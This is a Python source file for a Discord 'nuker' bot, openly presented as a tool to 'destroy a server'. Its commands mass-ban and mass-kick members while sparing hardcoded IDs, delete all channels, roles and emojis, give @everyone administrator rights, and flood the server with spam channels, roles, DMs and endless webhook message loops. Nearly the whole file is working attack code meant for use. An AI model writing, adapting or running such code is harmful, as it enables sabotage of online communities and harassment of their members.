import discord
import asyncio
import colorama 
import json
from discord.ext import commands
import os
import random 
from discord import Webhook, AsyncWebhookAdapter
from discord import Permissions




client = commands.Bot(command_prefix="#", intents = discord.Intents.all())



token = ""


CHANNEL_NAMES = ['HACKEROP']
MESSAGE_CONTENTS = ["hackerop"]
WEBHOOK_NAMES = ['hackerop']

client.remove_command('help')

                                         







@client.command()
async def ban(ctx):
        await ctx.message.delete()
        for member in ctx.guild.members:
         if member.id != 695070568826929214:
          for user in list(ctx.guild.members):
            try:
                await ctx.guild.ban(user)
                print (f"{user.name} Was Banned")
            except:
                pass


@client.command()
async def dmall(ctx, *, message:str):
  await ctx.message.delete()
  for channel in client.private_channels:
    try:
      await channel.send(f"{message}")
      print("Message Sent To {channel}")
    except:
      print("Message Not Sent To {channel}")



@client.command(pass_context=True)
async def admin(ctx):
  await ctx.message.delete()
  for role in list(ctx.guild.roles):
             if role.name == '@everyone':
                  try:
                      await role.edit(permissions=Permissions.all())
                      print("@everyone has admin") 
                  except:
                      print("Failed to give everyone admin")



@client.event
async def on_ready():
  await client.change_presence(activity=discord.Game(name= "MADE BY HACKER "))
print('''bot Is Ready To Destroy A Server ! 

╭╮╱╭╮╱╱╱╱╱╭╮╭━╮╱╱╭━━━╮╱╱╱╭━━━╮
┃┃╱┃┃╱╱╱╱╱┃┃┃╭╯╱╱┃╭━╮┃╱╱╱┃╭━╮┃
┃╰━╯┣━━┳━━┫╰╯╯╭━━┫╰━╯┣╮╱╭╋╯╭╯┃
┃╭━╮┃╭╮┃╭━┫╭╮┃┃┃━┫╭╮╭┫┃╱┃┣━╯╭╯
┃┃╱┃┃╭╮┃╰━┫┃┃╰┫┃━┫┃┃╰┫╰━╯┃┃╰━╮
╰╯╱╰┻╯╰┻━━┻╯╰━┻━━┻╯╰━┻━╮╭┻━━━╯
╱╱╱╱╱╱╱╱╱╱╱╱╱╱╱╱╱╱╱╱╱╭━╯┃
╱╱╱╱╱╱╱╱╱╱╱╱╱╱╱╱╱╱╱╱╱╰━━╯''')

@client.command(pass_context=True)
async def name(ctx, *, name):
  await ctx.message.delete()
  await ctx.guild.edit(name=name)

@client.command(pass_context=True)
async def emojidel(ctx):
 await ctx.message.delete()
 for emoji in list(ctx.guild.emojis):
            try:
                await emoji.delete()
                print (f"{emoji.name} has been deleted in {ctx.guild.name}")
            except:
                print (f"{emoji.name} has NOT been deleted in {ctx.guild.name}")

@client.command()
async def roles(ctx):
  await ctx.message.delete()
  for i in range(1, 250):
    try:
      await ctx.guild.create_role(name=f"HACKERONTOP")
      print("Created Roles")
    except:
        print("Failed To Create Role")


  
@client.command()
async def wizz(ctx, amount=50):
  await ctx.guild.edit(name="GANGSTERANDHACKERONTOP")
  channels = ctx.guild.channels
  for channel in channels:
    try:
      await channel.delete()
      print(channel.name + " Has been wizzed")
    except:
        pass
        print ("error")
        guild = ctx.message.guild
  for i in range(amount):
    try:  
      await ctx.guild.create_text_channel(random.choice(CHANNEL_NAMES))
      print(f"[{i}] channels made")
    except:
      print("error making channels")
  for role in ctx.guild.roles:
    try:
      await role.delet()
      print(f"{role.name} deleted")

    except:
      print(f"{role.name} not deleted")
  await asyncio.sleep(2)
  for i in range(100):  
    for i in range(1000):
      for channel in ctx.guild.channels:
        try:
          await channel.send(random.choice(MESSAGE_CONTENTS)
        )
          print(f"{channel.name} spammed")
        except:
          print(f"{channel.name} not spammed")
    for member in ctx.guild.members:
      if member.id != 320408390587121664:  
        try:
          await member.ban(reason="Beamed")
          print(f"{member.name} banned from {ctx.guild.name}")
        except:
          print(f"{member.name} not banned from {ctx.guild.name}")  

        
@client.event
async def on_guild_channel_create(channel):
  webhook =await channel.create_webhook(name = random.choice(WEBHOOK_NAMES))  
  while True:  
    await channel.send(random.choice(MESSAGE_CONTENTS))
    await webhook.send(random.choice(MESSAGE_CONTENTS), username=random.choice(WEBHOOK_NAMES))



@client.command()
async def kick(ctx):
  await ctx.message.delete()
  for member in ctx.guild.members:
    try:
      await member.kick(reason="beamed")
      print(member.name + "Has Been Kicked")
    except:
      print(member.name + "Has Not Been Kicked")

@client.command()
async def help(ctx, *args):
    await ctx.message.delete()
    retStr = str("""```fix\n❄️ #wizz - nukes server\n\n❄️ #ban - banall (non threaded)\n\n❄️ |#kick - kickall\n\n❄️ #roles - spams roles\n\n❄️ #emojidel - deletes emojis\n\n❄️ #dmall - dms everyone in guild\n\n❄️ #name - changes guild name\n\n❄️ #admin - gives all admin ```""")
    embed = discord.Embed(color=0xfffafa,title="Discord Nuker ❄️")
    embed.add_field(name="Help ⚠️",value=retStr)
    embed.set_footer(text=f'TERA BAAP HACKER HAI')

    await ctx.send(embed=embed)


client.run(token)
